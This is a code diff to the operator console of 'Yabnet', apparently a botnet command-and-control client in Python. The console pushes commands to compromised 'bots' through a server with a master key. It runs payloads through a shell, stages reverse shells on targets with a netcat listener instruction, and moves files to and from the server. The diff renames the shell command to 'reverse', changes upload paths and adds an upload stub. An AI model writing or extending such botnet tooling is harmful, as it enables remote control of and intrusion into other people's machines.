@@ -15,7 +15,6 @@ from subprocess import Popen, PIPE
 import cmd2
 from cmd2 import ansi
 
-REGISTERKEY = "registerkey"
 #MASTERKEY = "masterkey"
 TIMER = '12'
 
@@ -43,22 +42,10 @@ async def get_result(bot_ip):
     print(res.text) 
 
 
-"""
-def get_result(bot_ip):
-    url = URL + '/bot/' + bot_ip + '/result'
-    masterkey = MASTERKEY 
-
-    data = {'masterkey': masterkey}
-    time.sleep(5)
-    res = requests.post(url, data=data) 
-
-    return res.text 
-
-"""
-
 class CmdLineApp(cmd2.Cmd):
 
     CUSTOM_CATEGORY = 'My Custom Commands'
+    prompt = "Yabnet>> "
 
     def __init__(self):
         super().__init__(use_ipython=True)
@@ -247,7 +234,7 @@ ___  ___          _              _____                       _
                 process = Popen(payload, shell=True)
 
     """
-    Command: Shell 
+    Command: reverse 
     Description: Spawn an interactive shell between the target machine and the server. 
     """
     shell_parser = argparse.ArgumentParser()
@@ -255,18 +242,19 @@ ___  ___          _              _____                       _
     shell_parser.add_argument('-p', '--port', type=str, help="Reverse shell port")
     @cmd2.with_category(CUSTOM_CATEGORY)
     @cmd2.with_argparser(shell_parser)
-    def do_shell(self, args):
+    def do_reverse(self, args):
         url = URL + '/bot/' + args.target + '/push'
         masterkey = MASTERKEY 
         cmd = "shell " + args.port 
-
-        time.sleep(10)
 
         data = {'masterkey': masterkey, 'cmd': cmd}
         res = requests.post(url, data=data)
 
         output_shell = ansi.style("[+] Reverse shell staged. Openup netcat in a separate terminal! 'nc -lvnp <port>' " + args.port, fg='green', bold=True)
-         
+        output_shell = ansi.style("[+] You have 10 seconds to open a netcat listener... ", fg='green', bold=True)
+
+        time.sleep(10)
+
         self.poutput(output_shell)
 
     """
@@ -282,9 +270,9 @@ ___  ___          _              _____                       _
     @cmd2.with_argparser(download_parser)
     def do_download(self, args):
         # Error checking - Does the file exist?
-        my_file = pathlib.Path('/opt/yabnet/uploads/'+args.file)
+        my_file = pathlib.Path('../server/uploads/'+args.file)
         if my_file.exists() is False:
-            output_error = ansi.style("[-] The file does not exist in /opt/yabnet/uploads !", fg='red', bold=True)
+            output_error = ansi.style("[-] The file does not exist in <root>/server/uploads/ !", fg='red', bold=True)
             self.poutput(output_error)
             # TODO: Stop this command - I need to read the docs for this 
 
@@ -327,6 +315,16 @@ ___  ___          _              _____                       _
             self.poutput(ansi.style(response_data['result'], fg='green', bold=True))
         #self.poutput(data['result'])
 
+
+    # TODO: Implement file upload 
+    upload_parser = argparse.ArgumentParser()
+    upload_parser.add_argument('-f', '--file', type=str, help='Directory path and filename to be uploaded to the server')
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_argparser(upload_parser)
+    def do_upload(self, args):
+        url = URL + '/uploads'
+
+        pass 
 
     @cmd2.with_category(CUSTOM_CATEGORY)
     def do_exit(self, arg):
